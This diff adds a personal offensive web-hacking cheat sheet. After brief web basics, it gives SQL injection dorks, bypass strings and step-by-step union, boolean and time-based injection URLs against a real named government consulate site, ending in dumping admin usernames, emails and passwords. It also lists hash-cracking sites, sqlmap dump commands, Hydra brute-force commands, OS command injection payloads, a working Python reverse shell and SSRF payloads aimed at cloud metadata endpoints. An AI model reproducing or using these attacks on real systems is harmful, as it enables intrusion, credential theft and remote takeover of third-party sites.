@@ -1,0 +1,391 @@
+--How website work:
+Html 		> Just Create Web Content
+Css 		> Designing Web Content
+JavaScript 	> Dynamic and Interactive
+PHP 		> Server side of web Application and Dynamic
+SQL 		> Database Query
+
+--Domain > TLD[Top level Domain], SLD [Secend Level Domain]
+
+--TLD :
+1. gTLD  > .com, .org, .edu
+2. ccTLD > .bd, .in, .pak
+
+--finding gateway : ipconfig > IPv4 Address
+
+--python3 -m http.server 1234 > for create a server
+
+--Protocol : http, https, ftp, ssh, dns, telnet
+
+--Common Port:
+1. FTP (20, 21)
+2. SSH (22)
+3. SMB (139, 137, 445)
+4. DNS (53)
+5. HTTP / HTTPS (443, 80, 8080, 8443)
+6. Telnet (23)
+7. SMTP (25)
+8. TFTP (69)
+9. Database (1433,1434,3306)
+10. RDP(3389)
+
+--Http Methods:
+GET 		: The GET method requests a representation of the specified resource. Requests using GET should only retrieve data.
+HEAD 		: The HEAD method asks for a response identical to a GET request, but without the response body.
+POST 		: The POST method submits an entity to the specified resource, often causing a change in state or side effects on the server.
+PUT 		: The PUT method replaces all current representations of the target resource with the request payload.
+DELETE 		: The DELETE method deletes the specified resource.
+CONNECT 	: The CONNECT method establishes a tunnel to the server identified by the target resource.
+OPTIONS 	: The OPTIONS method describes the communication options for the target resource.
+TRACE 		: The TRACE method performs a message loop-back test along the path to the target resource.
+PATCH 		: The PATCH method applies partial modifications to a resource.
+
+--Status Code:
+1xx: Informational provides information about a request in progress.
+2xx: Successful indicates that the request was received and accepted.
+3xx: Redirection indicates that the request has to be redirected.
+4xx: Client Error indicates that an error has occurred on the client.
+5xx: Server Error indicates that an error has occurred on the server.
+
+200 (OK)
+301 (Moved Permanently)
+401 (Unauthorized)
+403 (Forbidden)
+404 (Not Found)
+408 (Request Timeout)
+429 (Too Many Requests)
+500 (Internal Server Error)
+502 (Bad Gateway)
+504 (Gateway Timeout)
+
+Cookies: Cookies are small files of information that a web server generates and sends to a web browser. Web browsers store the cookies they receive for a predetermined period of time, or for the length of a user's session on a website. They attach the relevant cookies to any future requests the user makes of the web server.
+
+--SQLI--
+
+Some Dorking:
+inurl:article.php?id= 
+inurl:article.php?id= 
+inurl:content.php?id= 
+inurl:detail.php?id= 
+inurl:gallery.php?id=
+inurl:index.php?id=
+inurl:index.php?id= 
+inurl:main.php?id= 
+inurl:news.php?id= 
+inurl:page.php?id= 
+inurl:pageid=
+inurl:index.php?id= site:.in
+inurl:main.php?id= site:.in
+
+inurl:article.php?id= site:"abc.xyz"
+inurl:article.php?id= site:"abc.xyz"
+inurl:content.php?id= site:"abc.xyz"
+inurl:detail.php?id=  site:"abc.xyz"
+inurl:gallery.php?id= site:"abc.xyz"
+inurl:index.php?id= site:"abc.xyz"
+inurl:index.php?id= site:"abc.xyz"
+inurl:main.php?id= site:"abc.xyz"
+inurl:news.php?id= site:"abc.xyz"
+inurl:page.php?id= site:"abc.xyz"
+inurl:pageid= site:"abc.xyz"
+
+Firefox Addon : https://addons.mozilla.org/en-US/firefox/addon/hackbar/
+
+URL Balancer:
+
+%00
+%23
+%23%23
+%60
+%90
+'))--+-
+')--+
+')--+-
+'--+
+'--+-
+))--
+)--
+)--+
+--
+-- -/*
+--+
+--+-
+/*
+;%00
+
+Method 01 : Union Based:
+1. Use '
+2. Fixed By -,--+-,--+,-- -
+3. Used order by 1 [union based > column Count > Order By]
+4. Used union all Select [union based > union stagment > union all select]
+5. Used database name One Shot [Union Based > database > database name one shot]
+6. Used TableName One Shot [Union Based > table > table Name One shot]
+7. Used COlumnBase One Shot [Union Based > Column > columnBased One Shot]
+8. Used data One Shot [Union Based > data > data One Shot]
+
+Method 02 : Union Based:
+1. Use ' and try Use URL Balancer
+2. Use +order+by+ and adding integer value for finding Column
+3. use +union+select and finding Vulnerable Column
+4. use @@version for finding version where your Column is Vulnerable
+5. use group_concat(table_name) and "+from+information_schema.tables+where+table_schema=database()"
+6. use group_concat(column_name) and "+from+information_schema.columns+where+table_name="
+7. use group_concat(username,0x3a,email,0x3a,password)
+
+Examples:
+1. http://www.pakconsulatejeddah.gov.pk/index.php?option=page&item=show&item_id=53
+2. http://www.pakconsulatejeddah.gov.pk/index.php?option=page&item=show&item_id=53+order+by+ 
+3. http://www.pakconsulatejeddah.gov.pk/index.php?option=page&item=show&item_id=-53+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13--
+4. http://www.pakconsulatejeddah.gov.pk/index.php?option=page&item=show&item_id=-53+union+select+1,2,3,4,@@version,6,7,8,9,10,11,12,13--
+5. http://www.pakconsulatejeddah.gov.pk/index.php?option=page&item=show&item_id=-53+union+select+1,2,3,4,group_concat(table_name),6,7,8,9,10,11,12,13+from+information_schema.tables+where+table_schema=database()--
+6. http://www.pakconsulatejeddah.gov.pk/index.php?option=page&item=show&item_id=-53+union+select+1,2,3,4,group_concat(column_name),6,7,8,9,10,11,12,13+from+information_schema.columns+where+table_name=CHAR(97, 100, 109, 105, 110)--
+7. http://www.pakconsulatejeddah.gov.pk/index.php?option=page&item=show&item_id=-53+union+select+1,2,3,4,group_concat(username,0x3a,email,0x3a,password),6,7,8,9,10,11,12,13+from+admin--
+
+Crack Site :
+http://aiisoo.com/
+https://crackstation.net/
+http://www.hashkiller.co.uk/
+
+Commands [ Get Method]
+sqlmap – url example.com --batch –dbs
+sqlmap –u exapmle.com –batch -D [database name] –tables
+sqlmap –u exapmle.com –batch -D [database name] –T [table name] –columns
+sqlmap –u exapmle.com –batch -D [database name] –T [table name] –C [ column name, column name] --dump
+
+Commands [ Post Method ]
+Sqlmap –r test.txt –p [parameter name] –batch --dbs
+Sqlmap –r test.txt –p [parameter name] –batch -D [database name] –tables
+Sqlmap –r test.txt –p [parameter name] –batch -D [database name] –T [table name] –columns
+Sqlmap –r test.txt –p [parameter name] –batch -D [database name] –T [table name] –C [columnname, column name] --dump
+Sqlmap –r test.txt –p [parameter name] –batch –dump –dbs
+
+Union Based - Get Based:
+01. use \ and try to use balancer
+02. use +order+by+ for finding how many column
+03. use +union+all+select for finding vulnerable table number 
+04. for find database use database() and find user() where is vulnerable table number
+05. for find full database use "Union Base > Database > Database Name group contact"
+06. for find full tables use "Union base > table > Table Name group contact"
+07. For find full Columns use "Union base > columns > Column Name group Concat"
+08. For find full data use "Union base > data > data group contact"
+
+Post Based:
+01. Use \ and try to use -- or # or {-- } for balancing
+02. use ' order by 3# for finding how many column
+03. use ' union all select 1,2# for finding vulnerable table number 
+04. use ' union all select version(),2# for finding version
+05. use ' union all select version(),database()# for finding version and database
+06. for find full database use "Union Base > Database > Database Name group contact"
+07. for find full tables use "Union base > table > Table Name group contact"
+08. For find full data use "Union base > data > data group contact"
+
+Common Command:
+create database name;
+create table signup(id int, username varchar(30),passwd varchar(20));
+insert into signup values(1,"munjur",12345),(2,"noman",55555),(3,"foysal",33333));
+
+select * from signup where username='munjur' or '1'='1';
+select * from signup where username='munjur' and '1'='1';
+
+Sql Methodology:
+-> Understanding website working
+-> Searching for parameter
+-> Manipulate for error
+-> solving the error
+-> accessing DB(you can use sqlmap)
+
+Error SQLI > Use this character : ',",\,/ etc
+Union SQLI > Union Select > Create a new row. > select * from signup where username = "faysal" UNION select 1,2,3;
+
+Blind Boolean SQLI > select * from login where id=2 or length(database()) = '1'
+Example : http://www.pakconsulatejeddah.gov.pk/index.php?item_id=53 and length(database()) = '1'
+Example : http://www.pakconsulatejeddah.gov.pk/index.php?item_id=53 or length(database()) = '1'
+
+Blind Time SQLI : sleep(5), or sleep(5)#, ' or sleep(5)#
+Example : select * from signup where username='Foysal' and if (database()="some",sleep(2),sleep(5));
+Example : http://www.pakconsulatejeddah.gov.pk/index.php?item_id=53 and if (database()="some",sleep(2),sleep(5));
+Example : http://www.pakconsulatejeddah.gov.pk/index.php?item_id=53 or if (database()="some",sleep(2),sleep(5));
+
+Common SQL:
+' or '1'='1
+' or '1'='1'#
+' or '1'='1'--
+' or '1'='1'/* 
+' or '1'='1
+' or '1'='2'#
+' or '1'='1 --
+' or '1'='2
+' or '1'='1'#
+
+--Broken Authentication--
+1. Season Management
+2. Credential Management
+
+Cookies Hampering Process::
+1. Using Cookie Editor
+2. Storage Cookies
+
+Credentital Breaking
+1. Brute Force Attack
+2. Authentication Process
+
+--Hydra--
+
+nmap -sV 127.0.0.1
+ssh : hydra -l molly -P rockyou.txt 127.0.0.1 ssh -V
+ssh : hydra -L user.txt -P rockyou.txt 127.0.0.1 ssh -V
+ssh login : ssh username@ip
+
+login form : hydra -l <username> -P <password-list> <target-ip> <module> <form-pattern>
+login form : hydra -l molly -P rockyou.txt 10.10.23.42 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
+login form : hydra -l molly -P rockyou.txt 10.10.23.42 http-get "/login?username=^USER^&password=^PASS^:Your username or password is incorrect."
+
+Describe : https://en.kali.tools/?p=220
+
+--OS Injection--
+
+* SQLI (SQL Injection)
+* OSI (Operating System Injection)
+* SSTI (Server site Template Injection)
+* XSSI (XSS Injection)
+
+OS Command Injection:: It is server side web vulnerabilities where attacker execute "System commannd" like id, whoami, uname etc or command
+
+When OS Command Injection Occur?
+OS Command Injection occurs when server-side code (PHP Based)in a web application makes a system call on the hosting machine
+
+Type OS Command::
+* Blind OS Command Injection
+* Active OS command Injection
+
+Blind OS Command Injection occurs when the system command made to the server does not return the response to the user in the html document.
+Active OS command Injection occurs when the system command made to the server does return the response to the user in the html document.
+
+Payload ::
+;id
+&ls
+|ls
+\nid\\n
+;system('cat/etc/passwd')
+;system('cat%20/etc/passwd')
+
+Paramter:
+?cmd={payload}
+?exec={command}
+?command={command}
+?execute{command}
+?ping={command}
+?query={command}
+?jump={command}
+?code={command}
+
+normally: ; & && |or|
+
+https://github.com/commixproject/commix
+https://github.com/payloadbox/command-injection-payload-list
+https://github.com/swisskyrepo/PayloadsAllTheThings
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
+
+For Reverse Shell:
+Firefox Extention: hack Tools
+https://www.revshells.com/
+https://tex2e.github.io/reverse-shell-generator/index.html
+https://weibell.github.io/reverse-shell-generator/
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+https://github.com/payloadbox/command-injection-payload-list
+
+Method:
+▶ First Find the parameter where os Command injected
+▶ then first know the os linux or windows via recon or nmap
+▶ then try normal os command and if you are blocking try to bypassing via previous notes
+▶ if you see that os command is executed try to reverse shell
+▶ Here {"local ip",port} must be changed
+▶ then this type is listening via terminal nc -lvnp port
+▶ If you see that it is listening thats mean its crack
+▶ use ; & && |or| those for connecting
+▶ Connector : |, ||, &, ;, &&,
+
+Reverse shell:
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("local ip",port));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' 
+
+--SSRF--
+
+http://localhost:80
+http://localhost:22
+https://localhost:443
+
+http://127.0.0.1:80
+http://127.0.0.1:22
+https://127.0.0.1:443
+
+http://0.0.0.0:80
+http://0.0.0.0:22
+https://0.0.0.0:443
+
+http://[::]:80/
+
+http://[0000::1]:80/
+
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+
+http://0/
+http://127.1
+http://127.0.1
+
+http://2130706433/ = http://127.0.0.1
+http://3232235521/ = http://192.168.0.1
+http://3232235777/ = http://192.168.1.1
+http://2852039166/ = http://169.254.169.254
+
+http://0177.0.0.1/ = http://127.0.0.1
+http://o177.0.0.1/ = http://127.0.0.1
+http://0o177.0.0.1/ = http://127.0.0.1
+http://q177.0.0.1/ = http://127.0.0.1
+
+http://127.0.0.1:80
+http://localhost:80
+http://[::1]:80  # IPv6 localhost
+
+http://127.0.0.1:22  # SSH
+http://127.0.0.1:3306  # MySQL
+http://127.0.0.1:6379  # Redis
+
+http://169.254.169.254/latest/meta-data  # AWS Metadata
+http://169.254.169.254/computeMetadata/v1  # GCP Metadata
+http://100.100.100.200/latest/meta-data  # Alibaba Cloud Metadata
+
+http://your-malicious-domain.com
+http://your-malicious-domain.com?data=somevalue
+
+file:///etc/passwd
+file:///c:/windows/win.ini
+
+smb://your-malicious-host
+ftp://your-malicious-host
+
+http://127.0.0.1:80/redirect?url=http://evil.com
+
+http://trusted-site.com/redirect?url=http://evil.com
+
+http://127.0.0.1%2f%2e%2e
+
+http://127.0.0.1%252f%252e%252e
+
+http://2130706433  # Decimal representation of 127.0.0.1
+http://0x7f000001  # Hexadecimal representation of 127.0.0.1
+
+X-Forwarded-For: 169.254.169.254
+
+Host: 169.254.169.254
+
+nmap -sV 127.0.0.1 -F
+
+
+
+
+
+
+
